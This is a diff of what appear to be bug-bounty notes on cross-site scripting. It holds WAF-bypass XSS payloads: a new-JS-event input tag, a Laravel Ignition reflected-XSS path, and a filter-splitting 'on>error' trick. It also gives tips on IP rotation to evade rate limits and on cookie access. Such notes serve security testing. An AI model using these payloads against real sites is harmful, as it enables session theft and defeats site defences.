@@ -163,7 +163,7 @@ so if user agent data is used as moitoring data likely of getting blind xss
 - Rotating IP to bypass rate limit or waf for linux like fuzzing or nuclei template
     * Shadow clone can be used to rotate ip with aws credentials
 ## WAf Bypass(XSS)    
-- new js    events released are not added to blacklist
+- new js events released are not added to blacklist
  * like `<input type="hidden" oncontentvisibilityautostatechange="alert(/CanaryChrome/)" style="content-visibility:auto">`
 - While exploiting document.cookie might be blocked
     * Then u can use only cookie insted
@@ -188,3 +188,10 @@ var req = new XMLHttpRequest(); req.onload = reqListener; req.open('delete','htt
 * If u find a website laravel framework then u can check for RXSS
 * There is chance of XSS if debug mode is on in `/_ignition/execute-solution`
 * Payload - `/_ignition/scripts/--%3E%3Csvg%20onload=alert('cappriciosec.com')%3E`
+### Flow in the backend to protect the website from payload
+* WAF(Blacklist->regex)->server-side filtering->then reflect
+* In this sceniro go step wise bypassing every step and utilizing server-side filter for our advantage
+    - First find out the context and pass the full payload 
+    - next find out the blacklisted elements and bypass the blacklist
+    - then if it is using regex to block like `on(regex)` and filtering `",>,<` this elements
+    - no can create a payload like `value="" type=image src=x on>error=aler>t(1)`
